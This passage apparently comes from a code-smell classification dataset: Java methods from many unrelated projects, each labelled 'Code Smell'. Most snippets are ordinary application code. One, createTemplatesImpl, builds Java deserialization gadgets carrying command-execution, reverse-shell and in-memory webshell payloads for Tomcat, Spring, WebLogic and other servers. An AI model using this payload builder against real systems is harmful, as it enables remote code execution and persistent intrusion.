            for (            String tenantId : user.tenantIds) {
              AuthRecipeUserInfo[] existingUsersWithNewEmail=authRecipeStorage.listPrimaryUsersByEmail_Transaction(appIdentifier,transaction,email);
              for (              AuthRecipeUserInfo userWithSameEmail : existingUsersWithNewEmail) {
                if (!userWithSameEmail.tenantIds.contains(tenantId)) {
                  continue;
                }
                if (userWithSameEmail.isPrimaryUser && !userWithSameEmail.getSupertokensUserId().equals(user.getSupertokensUserId())) {
                  throw new StorageTransactionLogicException(new EmailChangeNotAllowedException());
                }
              }
            }
          }
          try {
            epStorage.updateUsersEmail_Transaction(appIdentifier,transaction,userId,email);
          }
 catch (          DuplicateEmailException e) {
            throw new StorageTransactionLogicException(e);
          }
        }
        if (password != null) {
          String hashedPassword=PasswordHashing.getInstance(main).createHashWithSalt(appIdentifier,password);
          epStorage.updateUsersPassword_Transaction(appIdentifier,transaction,userId,hashedPassword);
        }
        epStorage.commitTransaction(transaction);
        return null;
      }
 catch (      TenantOrAppNotFoundException e) {
        throw new StorageTransactionLogicException(e);
      }
    }
);
  }
 catch (  StorageTransactionLogicException e) {
    if (e.actualException instanceof UnknownUserIdException) {
      throw (UnknownUserIdException)e.actualException;
    }
 else     if (e.actualException instanceof DuplicateEmailException) {
      throw (DuplicateEmailException)e.actualException;
    }
 else     if (e.actualException instanceof TenantOrAppNotFoundException) {
      throw (TenantOrAppNotFoundException)e.actualException;
    }
 else     if (e.actualException instanceof EmailChangeNotAllowedException) {
      throw (EmailChangeNotAllowedException)e.actualException;
    }
    throw e;
  }
}
",1,Code Smell
"/** 
 * Checks if the given analysis sequence is valid.
 * @param analyses       the given analysis sequence
 * @param reachableScope whether the analysis scope is set to reachable
 * @throws ConfigException if the given analyses is invalid
 */
private void validateAnalyses(List<AnalysisConfig> analyses,boolean reachableScope){
  for (int i=0; i < analyses.size(); ++i) {
    AnalysisConfig config=analyses.get(i);
    for (    AnalysisConfig required : manager.getRequiredConfigs(config)) {
      int rindex=analyses.indexOf(required);
      if (rindex == -1) {
        throw new ConfigException(String.format(""'%s' is required by '%s' but missing in analysis plan"",required,config));
      }
 else       if (rindex >= i) {
        throw new ConfigException(String.format(""'%s' is required by '%s' but it runs after '%s'"",required,config,config));
      }
    }
  }
  if (reachableScope) {
    AnalysisConfig cg=CollectionUtils.findFirst(analyses,AnalysisPlanner::isCG);
    if (cg == null) {
      throw new ConfigException(String.format(""Scope is reachable"" + "" but call graph builder (%s) is not given in analyses"",CallGraphBuilder.ID));
    }
    Set<AnalysisConfig> cgRequired=manager.getAllRequiredConfigs(cg);
    for (    AnalysisConfig config : analyses) {
      if (config.equals(cg)) {
        break;
      }
      if (!cgRequired.contains(config)) {
        throw new ConfigException(String.format(""Scope is reachable, thus '%s' "" + ""should be placed after call graph builder (%s)"",config,CallGraphBuilder.ID));
      }
    }
  }
}",1,Code Smell
"protected void place(HighwayBuilder b,MBPIterator it,int slot,State nextState){
  boolean placed=false;
  boolean finishedPlacing=false;
  for (  MBlockPos pos : it) {
    if (b.count >= b.placementsPerTick.get())     return;
    if (b.placeTimer > 0)     return;
    if (BlockUtils.place(pos.getBlockPos(),Hand.MAIN_HAND,slot,b.rotation.get().place,0,true,true,true)) {
      placed=true;
      b.blocksPlaced++;
      b.placeTimer=b.placeDelay.get();
      b.count++;
      if (b.placementsPerTick.get() == 1)       break;
    }
    if (!it.hasNext())     finishedPlacing=true;
  }
  if (finishedPlacing || !placed)   b.setState(nextState);
}",1,Code Smell
"@Override public Set<Long> getReceivers(CustomNoticeReceiverSaveBO receiverSaveBO,Long dataId){
  Set<Long> receiverIds=new HashSet<>();
  ModuleFieldDataCommon dataCommon=dataCommonService.getByDataId(dataId);
  if (ObjectUtil.isNull(dataCommon)) {
    return receiverIds;
  }
  List<UserInfo> userInfos=userService.queryUserInfoList().getData();
  if (receiverSaveBO.getNoticeCreator()) {
    receiverIds.add(dataCommon.getCreateUserId());
  }
  if (receiverSaveBO.getNoticeOwner()) {
    receiverIds.add(dataCommon.getOwnerUserId());
  }
  if (CollUtil.isNotEmpty(receiverSaveBO.getNoticeUser())) {
    receiverIds.addAll(receiverSaveBO.getNoticeUser());
  }
  if (CollUtil.isNotEmpty(receiverSaveBO.getNoticeRole())) {
    for (    Long roleId : receiverSaveBO.getNoticeRole()) {
      receiverIds.addAll(queryUserByRoleId(userInfos,roleId));
    }
  }
  Map<Long,Object> fieldIdDataMap=fieldDataService.queryFieldIdDataMap(dataId);
  if (CollUtil.isNotEmpty(receiverSaveBO.getUserField())) {
    for (    Long fieldId : receiverSaveBO.getUserField()) {
      Long receiverId=MapUtil.getLong(fieldIdDataMap,fieldId);
      if (ObjectUtil.isNotNull(receiverId)) {
        receiverIds.add(receiverId);
      }
    }
  }
  if (CollUtil.isNotEmpty(receiverSaveBO.getDeptField())) {
    Set<Long> deptIds=new HashSet<>();
    for (    Long fieldId : receiverSaveBO.getDeptField()) {
      Long deptId=MapUtil.getLong(fieldIdDataMap,fieldId);
      if (ObjectUtil.isNotNull(deptId)) {
        deptIds.add(deptId);
      }
    }
    if (CollUtil.isNotEmpty(deptIds)) {
      List<Long> userIds=userService.queryUserByDeptIds(deptIds).getData();
      receiverIds.addAll(userIds);
    }
  }
  if (CollUtil.isNotEmpty(receiverSaveBO.getParentLevel())) {
    for (    Integer level : receiverSaveBO.getParentLevel()) {
      Long parentUserId=queryParentUserByLevel(dataCommon.getOwnerUserId(),level);
      if (ObjectUtil.isNotNull(parentUserId) && ObjectUtil.notEqual(0L,parentUserId)) {
        receiverIds.add(parentUserId);
      }
    }
  }
  return receiverIds;
}",1,Code Smell
"private static void feedFriend(){
  try {
    String s, memo;
    JSONObject jo;
    for (int i=0; i < Config.getFeedFriendAnimalList().size(); i++) {
      String userId=Config.getFeedFriendAnimalList().get(i);
      if (userId.equals(FriendIdMap.getCurrentUid()))       continue;
      if (!Statistics.canFeedFriendToday(userId,Config.getFeedFriendCountList().get(i)))       continue;
      s=AntFarmRpcCall.enterFarm("""",userId);
      jo=new JSONObject(s);
      memo=jo.getString(""memo"");
      if (""SUCCESS"".equals(memo)) {
        jo=jo.getJSONObject(""farmVO"").getJSONObject(""subFarmVO"");
        String friendFarmId=jo.getString(""farmId"");
        JSONArray jaAnimals=jo.getJSONArray(""animals"");
        for (int j=0; j < jaAnimals.length(); j++) {
          jo=jaAnimals.getJSONObject(j);
          String masterFarmId=jo.getString(""masterFarmId"");
          if (masterFarmId.equals(friendFarmId)) {
            jo=jo.getJSONObject(""animalStatusVO"");
            if (AnimalInteractStatus.HOME.name().equals(jo.getString(""animalInteractStatus"")) && AnimalFeedStatus.HUNGRY.name().equals(jo.getString(""animalFeedStatus""))) {
              feedFriendAnimal(friendFarmId,FriendIdMap.getNameById(userId));
            }
            break;
          }
        }
      }
 else {
        Log.recordLog(memo,s);
      }
    }
  }
 catch (  Throwable t) {
    Log.i(TAG,""feedFriend err:"");
    Log.printStackTrace(TAG,t);
  }
}",1,Code Smell
"/** 
 * Remove expired records All forbidden records will be removed after the specified time
 */
public void rmvAllExpiredRecords(){
  long curTime=System.currentTimeMillis();
  Set<String> expiredAddrs=new HashSet<>();
  for (  Map.Entry<String,RemoteConErrStats> entry : remoteAddrMap.entrySet()) {
    if (entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    if (entry.getValue().isExpiredRecord(curTime)) {
      expiredAddrs.add(entry.getKey());
    }
  }
  if (!expiredAddrs.isEmpty()) {
    for (    String tmpAddr : expiredAddrs) {
      RemoteConErrStats rmtConErrStats=remoteAddrMap.get(tmpAddr);
      if (rmtConErrStats == null) {
        continue;
      }
      if (rmtConErrStats.isExpiredRecord(curTime)) {
        remoteAddrMap.remove(tmpAddr);
      }
    }
  }
  expiredAddrs.clear();
  curTime=System.currentTimeMillis();
  for (  Map.Entry<String,Long> entry : forbiddenAddrMap.entrySet()) {
    if (entry.getKey() == null || entry.getValue() == null) {
      continue;
    }
    if ((curTime - entry.getValue()) > (linkStatsForbiddenDurMs + 60000)) {
      expiredAddrs.add(entry.getKey());
    }
  }
  if (!expiredAddrs.isEmpty()) {
    for (    String tmpAddr : expiredAddrs) {
      Long recordTime=forbiddenAddrMap.get(tmpAddr);
      if (recordTime == null) {
        continue;
      }
      if ((curTime - recordTime) > (linkStatsForbiddenDurMs + 60000)) {
        forbiddenAddrMap.remove(tmpAddr);
      }
    }
  }
}",1,Code Smell
"private void addElementToView(Element element,StaticView view,String identifier){
  try {
    if (element instanceof CustomElement) {
      view.add((CustomElement)element);
    }
 else     if (element instanceof Person) {
      view.add((Person)element);
    }
 else     if (element instanceof SoftwareSystem) {
      view.add((SoftwareSystem)element);
    }
 else     if (element instanceof Container && (view instanceof ContainerView)) {
      ((ContainerView)view).add((Container)element);
    }
 else     if (element instanceof Container && (view instanceof ComponentView)) {
      ((ComponentView)view).add((Container)element);
    }
 else     if (element instanceof Component && (view instanceof ComponentView)) {
      ((ComponentView)view).add((Component)element);
    }
 else {
      if (!StringUtils.isNullOrEmpty(identifier)) {
        throw new RuntimeException(""The element \"""" + identifier + ""\"" can not be added to this type of view"");
      }
    }
  }
 catch (  ElementNotPermittedInViewException e) {
  }
}
",1,Code Smell
"/** 
 * 瑙ｆ瀽鏁版嵁浜ゆ崲寮傚父I18N娑堟伅銆�
 * @param e
 * @return
 */
protected String resolveDataExchangeExceptionI18n(DataExchangeException e){
  String message="""";
  String code=buildDataExchangeExceptionI18nCode(e);
  if (e instanceof ColumnNotFoundException) {
    ColumnNotFoundException e1=(ColumnNotFoundException)e;
    message=getI18nMessage(code,e1.getTable(),e1.getColumnName());
  }
 else   if (e instanceof TableMismatchException) {
    TableMismatchException e1=(TableMismatchException)e;
    message=getI18nMessage(code,e1.getTable());
  }
 else   if (e instanceof TableNotFoundException) {
    TableNotFoundException e1=(TableNotFoundException)e;
    message=getI18nMessage(code,e1.getTable());
  }
 else   if (e instanceof ExecuteDataImportSqlException) {
    ExecuteDataImportSqlException e1=(ExecuteDataImportSqlException)e;
    message=getI18nMessage(code,e1.getCause().getMessage());
  }
 else   if (e instanceof IllegalImportSourceValueException) {
    IllegalImportSourceValueException e1=(IllegalImportSourceValueException)e;
    message=getI18nMessage(code,e1.getColumnName(),e1.getSourceValue());
  }
 else   if (e instanceof SetImportColumnValueException) {
    SetImportColumnValueException e1=(SetImportColumnValueException)e;
    message=getI18nMessage(code,e1.getColumnName(),e1.getSourceValue());
  }
 else   if (e instanceof IndexDataExchangeException) {
    IndexDataExchangeException e1=(IndexDataExchangeException)e;
    message=getI18nMessage(code,e1.getDataIndex());
  }
 else   if (e instanceof UnsupportedExchangeException) {
    message=getI18nMessage(code);
  }
 else   if (e instanceof CircularDependencyException) {
    CircularDependencyException e1=(CircularDependencyException)e;
    message=getI18nMessage(code,e1.getSubDataExchange().getName());
  }
 else   if (e instanceof IllegalJsonDataFormatException) {
    IllegalJsonDataFormatException e1=(IllegalJsonDataFormatException)e;
    message=getI18nMessage(code,e1.getMessage());
  }
 else   if (e instanceof SqlValidationException) {
    SqlValidationException e1=(SqlValidationException)e;
    message=getI18nMessage(code,e1.getSqlValidation().getInvalidValue());
  }
 else {
    message=getI18nMessage(code,getRootCauseMessage(e));
  }
  return message;
}",1,Code Smell
"public void loadStatus(boolean force){
  if (loadingStatus || loadedStatus && !force)   return;
  loadingStatus=true;
  ConnectionsManager.getInstance(currentAccount).sendRequest(new TL_smsjobs.TL_smsjobs_getStatus(),(res,err) -> AndroidUtilities.runOnUIThread(() -> {
    TL_smsjobs.TL_smsjobs_status lastStatus=currentStatus;
    TL_smsjobs.TL_smsjobs_eligibleToJoin lastIsEligible=isEligible;
    int lastState=currentState, state=currentState;
    loadingStatus=false;
    loadedStatus=true;
    if (res instanceof TL_smsjobs.TL_smsjobs_status) {
      state=STATE_JOINED;
      currentStatus=(TL_smsjobs.TL_smsjobs_status)res;
      saveCacheStatus();
    }
 else     if (err != null && ""NOT_JOINED"".equals(err.text)) {
      if (state == STATE_JOINED) {
        state=STATE_NONE;
      }
      currentStatus=null;
      saveCacheStatus();
    }
 else     if (err != null && ""NOT_ELIGIBLE"".equals(err.text)) {
      if (state == STATE_JOINED) {
        state=STATE_NONE;
      }
      currentStatus=null;
      isEligible=null;
      saveCacheStatus();
    }
 else {
      BulletinFactory.showError(err);
    }
    if (lastStatus != currentStatus || lastIsEligible != isEligible || lastState != state) {
      setState(state);
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.mainUserInfoChanged);
      NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.smsJobStatusUpdate);
      SMSJobsNotification.check();
    }
  }
));
}
",1,Code Smell
"@Override public Set<BugInstance> analyze(JClass jclass){
  boolean implementsCloneableDirectly=false;
  boolean invokesSuperClone=false;
  boolean isCloneable=false;
  boolean isFinal=jclass.isFinal();
  Set<BugInstance> bugInstances=Sets.newSet();
  if (jclass.isInterface() || jclass.isAbstract()) {
    return Set.of();
  }
  for (  JClass iface : jclass.getInterfaces()) {
    if (ClassNames.CLONEABLE.equals(iface.getName())) {
      implementsCloneableDirectly=true;
      isCloneable=true;
      break;
    }
  }
  ClassHierarchy hierarchy=World.get().getClassHierarchy();
  JClass classCloneable=hierarchy.getClass(ClassNames.CLONEABLE);
  if (hierarchy.isSubclass(classCloneable,jclass)) {
    isCloneable=true;
  }
  boolean cloneIsDeprecated=false;
  boolean hasCloneMethod=false;
  for (  JMethod jmethod : jclass.getDeclaredMethods()) {
    if (!jmethod.isAbstract() && jmethod.isPublic() && jmethod.getSubsignature().toString().equals(""java.lang.Object clone()"")) {
      hasCloneMethod=true;
      cloneIsDeprecated=jmethod.getAnnotation(""java.lang.Deprecated"") != null;
      for (      Stmt stmt : jmethod.getIR()) {
        if (stmt instanceof Invoke) {
          InvokeExp invokeExp=invoke.getInvokeExp();
          if (invokeExp instanceof InvokeSpecial && ((InvokeSpecial)invokeExp).getBase().getName().equals(""%this"")) {
            invokesSuperClone=true;
          }
        }
      }
    }
  }
  if (implementsCloneableDirectly && !hasCloneMethod) {
    bugInstances.add(new BugInstance(BugType.CN_IDIOM,Severity.MINOR,jclass));
  }
  if (hasCloneMethod && isCloneable && !invokesSuperClone&& !isFinal&& jclass.isPublic()) {
    bugInstances.add(new BugInstance(BugType.CN_IDIOM_NO_SUPER_CALL,Severity.MINOR,jclass));
  }
 else   if (hasCloneMethod && !isCloneable && !cloneIsDeprecated&& !jclass.isAbstract()) {
    bugInstances.add(new BugInstance(BugType.CN_IMPLEMENTS_CLONE_BUT_NOT_CLONEABLE,Severity.MINOR,jclass));
  }
  return bugInstances;
}
",1,Code Smell
"public static Object createTemplatesImpl(PayloadType type,String... param) throws Exception {
  if (Boolean.parseBoolean(System.getProperty(""properXalan"",""false""))) {
    return createTemplatesImpl(type,Class.forName(""org.apache.xalan.xsltc.trax.TemplatesImpl""),Class.forName(""org.apache.xalan.xsltc.runtime.AbstractTranslet""),Class.forName(""org.apache.xalan.xsltc.trax.TransformerFactoryImpl""),param);
  }
  return createTemplatesImpl(type,TemplatesImpl.class,AbstractTranslet.class,TransformerFactoryImpl.class,param);
}
public static <T>T createTemplatesImpl(PayloadType type,Class<T> tplClass,Class<?> abstTranslet,Class<?> transFactory,String... param) throws Exception {
  final T templates=tplClass.newInstance();
  byte[] classBytes=null;
switch (type) {
case command:
    CommandTemplate commandTemplate=new CommandTemplate(param[0]);
  classBytes=commandTemplate.getBytes();
break;
case dnslog:
DnslogTemplate dnslogTemplate=new DnslogTemplate(param[0]);
classBytes=dnslogTemplate.getBytes();
break;
case reverseshell:
ReverseShellTemplate reverseShellTemplate=new ReverseShellTemplate(param[0],param[1]);
classBytes=reverseShellTemplate.getBytes();
break;
case tomcatecho:
classBytes=Cache.get(""TomcatEchoTemplate"");
break;
case springecho:
classBytes=Cache.get(""SpringEchoTemplate"");
break;
case weblogicecho:
classBytes=Cache.get(""WeblogicEchoTemplate"");
break;
case tomcatmemshell1:
classBytes=Cache.get(""TomcatMemshellTemplate1"");
break;
case tomcatmemshell2:
classBytes=Cache.get(""TomcatMemshellTemplate2"");
break;
case jettymemshell:
classBytes=Cache.get(""JettyMemshellTemplate"");
break;
case jbossmemshell:
classBytes=Cache.get(""JBossMemshellTemplate"");
break;
case weblogicmemshell1:
classBytes=Cache.get(""WeblogicMemshellTemplate1"");
break;
case weblogicmemshell2:
classBytes=Cache.get(""WeblogicMemshellTemplate2"");
break;
case webspherememshell:
classBytes=Cache.get(""WebsphereMemshellTemplate"");
break;
case springmemshell:
classBytes=Cache.get(""SpringMemshellTemplate"");
break;
}
Reflections.setFieldValue(templates,""_bytecodes"",new byte[][]{classBytes,ClassFiles.classAsBytes(Foo.class)});
Reflections.setFieldValue(templates,""_name"",""Pwnr"");
Reflections.setFieldValue(templates,""_tfactory"",transFactory.newInstance());
return templates;
}",1,Code Smell
"private void updateAuthHintCellVisibility(boolean visible){
  if (authHintCellVisible != visible) {
    authHintCellVisible=visible;
    if (authHintCell == null) {
      return;
    }
    if (authHintCellAnimator != null) {
      authHintCellAnimator.cancel();
      authHintCellAnimator=null;
    }
    if (visible) {
      authHintCell.setVisibility(View.VISIBLE);
    }
    authHintCell.setAlpha(1f);
    viewPages[0].listView.requestLayout();
    fragmentView.requestLayout();
    notificationsLocker.lock();
    authHintCellAnimating=true;
    ValueAnimator valueAnimator=ValueAnimator.ofFloat(authHintCellProgress,visible ? 1f : 0);
    int pos=viewPages[0].layoutManager.findFirstVisibleItemPosition();
    int childTop=0;
    if (pos != RecyclerView.NO_POSITION) {
      childTop=viewPages[0].layoutManager.findViewByPosition(pos).getTop();
      childTop+=visible ? 0 : -authHintCell.getMeasuredHeight();
    }
    int finalChildTop=childTop;
    AndroidUtilities.doOnLayout(fragmentView,() -> {
      float listDy=authHintCell.getMeasuredHeight();
      if (!visible) {
        View view=viewPages[0].layoutManager.findViewByPosition(pos);
        if (view != null) {
          int newTop=view.getTop();
          listDy+=(finalChildTop - newTop);
        }
      }
      float finalListDy=listDy;
      viewPages[0].listView.setTranslationY(finalListDy * authHintCellProgress);
      valueAnimator.addUpdateListener(animation -> {
        authHintCellProgress=(float)animation.getAnimatedValue();
        viewPages[0].listView.setTranslationY(finalListDy * authHintCellProgress);
        updateContextViewPosition();
      }
);
      valueAnimator.addListener(new AnimatorListenerAdapter(){
        @Override public void onAnimationEnd(        Animator animation){
          notificationsLocker.unlock();
          authHintCellAnimating=false;
          authHintCellProgress=visible ? 1f : 0;
          if (fragmentView != null) {
            fragmentView.requestLayout();
          }
          viewPages[0].listView.requestLayout();
          viewPages[0].listView.setTranslationY(0);
          if (!visible) {
            authHintCell.setVisibility(View.GONE);
          }
        }
      }
);
      valueAnimator.setDuration(250);
      valueAnimator.setInterpolator(CubicBezierInterpolator.DEFAULT);
      valueAnimator.start();
    }
);
  }
}",1,Code Smell
"/** 
 * Generate dynamic delegate for ByteBuddy
 * @param pluginFinder   gets the whole plugin list.
 * @param classesTypeMap hosts the class binary.
 * @return true if have JRE instrumentation requirement.
 * @throws PluginException when generate failure.
 */
private static boolean prepareJREInstrumentation(PluginFinder pluginFinder,Map<String,byte[]> classesTypeMap) throws PluginException {
  TypePool typePool=TypePool.Default.of(BootstrapInstrumentBoost.class.getClassLoader());
  List<AbstractClassEnhancePluginDefine> bootstrapClassMatchDefines=pluginFinder.getBootstrapClassMatchDefine();
  for (  AbstractClassEnhancePluginDefine define : bootstrapClassMatchDefines) {
    if (Objects.nonNull(define.getInstanceMethodsInterceptPoints())) {
      for (      InstanceMethodsInterceptPoint point : define.getInstanceMethodsInterceptPoints()) {
        if (point.isOverrideArgs()) {
          generateDelegator(classesTypeMap,typePool,INSTANCE_METHOD_WITH_OVERRIDE_ARGS_DELEGATE_TEMPLATE,point.getMethodsInterceptor());
        }
 else {
          generateDelegator(classesTypeMap,typePool,INSTANCE_METHOD_DELEGATE_TEMPLATE,point.getMethodsInterceptor());
        }
      }
    }
    if (Objects.nonNull(define.getConstructorsInterceptPoints())) {
      for (      ConstructorInterceptPoint point : define.getConstructorsInterceptPoints()) {
        generateDelegator(classesTypeMap,typePool,CONSTRUCTOR_DELEGATE_TEMPLATE,point.getConstructorInterceptor());
      }
    }
    if (Objects.nonNull(define.getStaticMethodsInterceptPoints())) {
      for (      StaticMethodsInterceptPoint point : define.getStaticMethodsInterceptPoints()) {
        if (point.isOverrideArgs()) {
          generateDelegator(classesTypeMap,typePool,STATIC_METHOD_WITH_OVERRIDE_ARGS_DELEGATE_TEMPLATE,point.getMethodsInterceptor());
        }
 else {
          generateDelegator(classesTypeMap,typePool,STATIC_METHOD_DELEGATE_TEMPLATE,point.getMethodsInterceptor());
        }
      }
    }
  }
  return bootstrapClassMatchDefines.size() > 0;
}",1,Code Smell
"private static Class<?> getEntityClass(Class<?> mapperClass){
  if (mapperClass == null || mapperClass == Object.class) {
    return null;
  }
  return getEntityClass(mapperClass,null);
}
private static Class<?> getEntityClass(Class<?> mapperClass,Type[] actualTypeArguments){
  Type[] genericInterfaces=mapperClass.getGenericInterfaces();
  for (  Type type : genericInterfaces) {
    if (type instanceof ParameterizedType) {
      ParameterizedType parameterizedType=(ParameterizedType)type;
      Type rawType=parameterizedType.getRawType();
      Type[] typeArguments=parameterizedType.getActualTypeArguments();
      adjustTypeArguments(mapperClass,actualTypeArguments,typeArguments);
      if (rawType == BaseMapper.class) {
        if (typeArguments[0] instanceof Class) {
          return (Class<?>)typeArguments[0];
        }
      }
 else       if (rawType instanceof Class) {
        Class<?> entityClass=getEntityClass((Class<?>)rawType,typeArguments);
        if (entityClass != null) {
          return entityClass;
        }
      }
    }
 else     if (type instanceof Class) {
      Class<?> entityClass=getEntityClass((Class<?>)type);
      if (entityClass != null) {
        return entityClass;
      }
    }
  }
  Class<?> superclass=mapperClass.getSuperclass();
  if (superclass == null || superclass == Object.class) {
    return null;
  }
  Type[] typeArguments=superclass.getTypeParameters();
  adjustTypeArguments(mapperClass,actualTypeArguments,typeArguments);
  return getEntityClass(superclass,typeArguments);
}",1,Code Smell
"public JavaDeserializer(Class<?> cl){
  _type=cl;
  _fieldMap=getFieldMap(cl);
  _readResolve=getReadResolve(cl);
  if (_readResolve != null) {
    _readResolve.setAccessible(true);
  }
  Constructor<?>[] constructors=cl.getDeclaredConstructors();
  long bestCost=Long.MAX_VALUE;
  for (int i=0; i < constructors.length; i++) {
    Class<?>[] param=constructors[i].getParameterTypes();
    long cost=0;
    for (int j=0; j < param.length; j++) {
      cost=4 * cost;
      if (Object.class.equals(param[j]))       cost+=1;
 else       if (String.class.equals(param[j]))       cost+=2;
 else       if (int.class.equals(param[j]))       cost+=3;
 else       if (long.class.equals(param[j]))       cost+=4;
 else       if (param[j].isPrimitive())       cost+=5;
 else       cost+=6;
    }
    if (cost < 0 || cost > (1 << 48))     cost=1 << 48;
    cost+=(long)param.length << 48;
    if (cost < bestCost) {
      _constructor=constructors[i];
      bestCost=cost;
    }
  }
  if (_constructor != null) {
    _constructor.setAccessible(true);
    Class<?>[] params=_constructor.getParameterTypes();
    _constructorArgs=new Object[params.length];
    for (int i=0; i < params.length; i++) {
      _constructorArgs[i]=getParamArg(params[i]);
    }
  }
}",1,Code Smell
"public void destroy(boolean draft){
  if (blurredVideoThumb != null && !blurredVideoThumb.isRecycled()) {
    blurredVideoThumb.recycle();
    blurredVideoThumb=null;
  }
  if (uploadThumbFile != null) {
    uploadThumbFile.delete();
    uploadThumbFile=null;
  }
  if (!draft) {
    clearPaint();
    clearFilter();
    if (file != null) {
      if (fileDeletable && (!isEdit || editedMedia)) {
        file.delete();
      }
      file=null;
    }
    if (thumbPath != null) {
      if (fileDeletable) {
        new File(thumbPath).delete();
      }
      thumbPath=null;
    }
    if (mediaEntities != null) {
      for (      VideoEditedInfo.MediaEntity entity : mediaEntities) {
        if (entity.type == VideoEditedInfo.MediaEntity.TYPE_PHOTO && !TextUtils.isEmpty(entity.segmentedPath)) {
          try {
            new File(entity.segmentedPath).delete();
          }
 catch (          Exception e) {
            FileLog.e(e);
          }
          entity.segmentedPath="""";
        }
      }
    }
    if (round != null && (!isEdit || editedMedia)) {
      round.delete();
      round=null;
    }
    if (roundThumb != null && (!isEdit || editedMedia)) {
      try {
        new File(roundThumb).delete();
      }
 catch (      Exception e) {
      }
      roundThumb=null;
    }
  }
  if (thumbPathBitmap != null) {
    thumbPathBitmap.recycle();
    thumbPathBitmap=null;
  }
  cancelCheckStickers();
}
",1,Code Smell
"public void drawTime(Canvas canvas,float alpha,boolean fromParent){
  if (!drawFromPinchToZoom && delegate != null && delegate.getPinchToZoomHelper() != null && delegate.getPinchToZoomHelper().isInOverlayModeFor(this) && shouldDrawTimeOnMedia()) {
    return;
  }
  for (int i=0; i < 2; i++) {
    float currentAlpha=alpha;
    if (i == 0 && isDrawSelectionBackground() && currentSelectedBackgroundAlpha == 1f && !shouldDrawTimeOnMedia()) {
      continue;
    }
 else     if (i == 1 && ((!isDrawSelectionBackground() && currentSelectedBackgroundAlpha == 0) || shouldDrawTimeOnMedia())) {
      break;
    }
    boolean drawSelectionBackground=i == 1;
    if (i == 1) {
      currentAlpha*=currentSelectedBackgroundAlpha;
    }
 else     if (!shouldDrawTimeOnMedia()) {
      currentAlpha*=(1f - currentSelectedBackgroundAlpha);
    }
    if (transitionParams.animateShouldDrawTimeOnMedia && transitionParams.animateChangeProgress != 1f) {
      if (shouldDrawTimeOnMedia()) {
        overideShouldDrawTimeOnMedia=1;
        drawTimeInternal(canvas,currentAlpha * transitionParams.animateChangeProgress,fromParent,this.timeX,timeLayout,timeWidth,drawSelectionBackground);
        overideShouldDrawTimeOnMedia=2;
        drawTimeInternal(canvas,currentAlpha * (1f - transitionParams.animateChangeProgress),fromParent,transitionParams.animateFromTimeX,transitionParams.animateTimeLayout,transitionParams.animateTimeWidth,drawSelectionBackground);
      }
 else {
        overideShouldDrawTimeOnMedia=2;
        drawTimeInternal(canvas,currentAlpha * transitionParams.animateChangeProgress,fromParent,this.timeX,timeLayout,timeWidth,drawSelectionBackground);
        overideShouldDrawTimeOnMedia=1;
        drawTimeInternal(canvas,currentAlpha * (1f - transitionParams.animateChangeProgress),fromParent,transitionParams.animateFromTimeX,transitionParams.animateTimeLayout,transitionParams.animateTimeWidth,drawSelectionBackground);
      }
      overideShouldDrawTimeOnMedia=0;
    }
 else {
      float timeX;
      float timeWidth;
      if (transitionParams.shouldAnimateTimeX) {
        timeX=this.timeX * transitionParams.animateChangeProgress + transitionParams.animateFromTimeX * (1f - transitionParams.animateChangeProgress);
        timeWidth=this.timeWidth * transitionParams.animateChangeProgress + transitionParams.animateTimeWidth * (1f - transitionParams.animateChangeProgress);
      }
 else {
        timeX=this.timeX + transitionParams.deltaRight;
        timeWidth=this.timeWidth;
      }
      drawTimeInternal(canvas,currentAlpha,fromParent,timeX,timeLayout,timeWidth,drawSelectionBackground);
    }
  }
  if (transitionParams.animateBackgroundBoundsInner) {
    drawOverlays(canvas);
  }
}",1,Code Smell
"public void checkGenericAnimations(){
  if (getUserConfig().genericAnimationsStickerPack != null) {
    String packName=getUserConfig().genericAnimationsStickerPack;
    TLRPC.TL_messages_stickerSet set=getStickerSetByName(packName);
    if (set == null) {
      set=getStickerSetByEmojiOrName(packName);
    }
    if (set == null) {
      MediaDataController.getInstance(currentAccount).loadStickersByEmojiOrName(packName,false,true);
    }
  }
  if (loadingGenericAnimations || System.currentTimeMillis() - getUserConfig().lastUpdatedGenericAnimations < 86400000) {
    return;
  }
  loadingGenericAnimations=true;
  TLRPC.TL_messages_getStickerSet req=new TLRPC.TL_messages_getStickerSet();
  req.stickerset=new TLRPC.TL_inputStickerSetEmojiGenericAnimations();
  getConnectionsManager().sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
    if (response instanceof TLRPC.TL_messages_stickerSet) {
      TLRPC.TL_messages_stickerSet stickerSet=(TLRPC.TL_messages_stickerSet)response;
      getUserConfig().genericAnimationsStickerPack=stickerSet.set.short_name;
      getUserConfig().lastUpdatedGenericAnimations=System.currentTimeMillis();
      getUserConfig().saveConfig(false);
      processLoadedDiceStickers(getUserConfig().genericAnimationsStickerPack,false,stickerSet,false,(int)(System.currentTimeMillis() / 1000));
      for (int i=0; i < stickerSet.documents.size(); i++) {
        if (currentAccount == UserConfig.selectedAccount) {
          preloadImage(ImageLocation.getForDocument(stickerSet.documents.get(i)),FileLoader.PRIORITY_LOW);
        }
      }
    }
  }
));
}",1,Code Smell
"static ExpressionElement parseInternal(StringReader input,ParserOptions options) throws ParseException {
  final Parser stack=new Parser();
  ParserOptions.TokenRules tokenRules=options.getTokenRules();
  while (input.canRead()) {
    input.skipWhitespace();
    if (!input.canRead()) {
      break;
    }
    char c=input.read();
    if (tokenRules.isIdStart(c)) {
      final String id=readWhile(input,tokenRules::isIdPart);
      stack.visitId(id);
    }
 else     if (c == '.' && stack.canReadAccess()) {
      input.skipWhitespace();
      if (input.canRead()) {
        char start=input.read();
        if (!tokenRules.isAccessStart(start)) {
          throw new UnexpectedCharacterException(""a valid accessor"",start,input.getCurrentIndex());
        }
        final String access=readWhile(input,tokenRules::isAccessPart);
        stack.visitAccess(access);
      }
 else {
        throw new UnexpectedEndingException(""An expression can't end with '.'"");
      }
    }
 else     if (tokenRules.isNumberStart(c)) {
      final String numberString=readWhile(input,tokenRules::isNumberPart);
      stack.visitNumber(numberString);
    }
 else     if (c == '(') {
      stack.visitOpeningParenthesis();
    }
 else     if (c == ',') {
      stack.visitComma(input.getCurrentIndex());
    }
 else     if (c == ')') {
      stack.visitClosingParenthesis(input.getCurrentIndex());
    }
 else {
      if (stack.canReadBinaryOp()) {
        OpResolver<? extends BinaryOp> resolver=options.getBinaryOpResolver(c);
        if (resolver != null) {
